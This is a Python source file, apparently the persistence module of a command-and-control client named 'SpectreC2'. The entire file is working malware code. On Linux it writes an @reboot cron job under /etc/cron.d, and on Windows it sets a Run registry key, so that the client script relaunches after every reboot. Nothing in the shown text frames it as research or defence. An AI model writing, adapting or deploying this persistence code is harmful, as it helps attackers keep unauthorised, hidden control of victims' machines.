# client/persistence.py

import os
import platform
import shutil

def install_persistence(script_path="client.py"):
    system = platform.system()

    if system == "Linux":
        cron_line = f"@reboot python3 {os.path.abspath(script_path)}\n"
        with open("/etc/cron.d/spectrec2", "w") as f:
            f.write(cron_line)
        os.chmod("/etc/cron.d/spectrec2", 0o644)

    elif system == "Windows":
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SpectreC2", 0, winreg.REG_SZ, os.path.abspath(script_path))
        winreg.CloseKey(key)

    else:
        print(f"[-] Persistence not supported on {system} yet.")

if __name__ == "__main__":
    install_persistence()
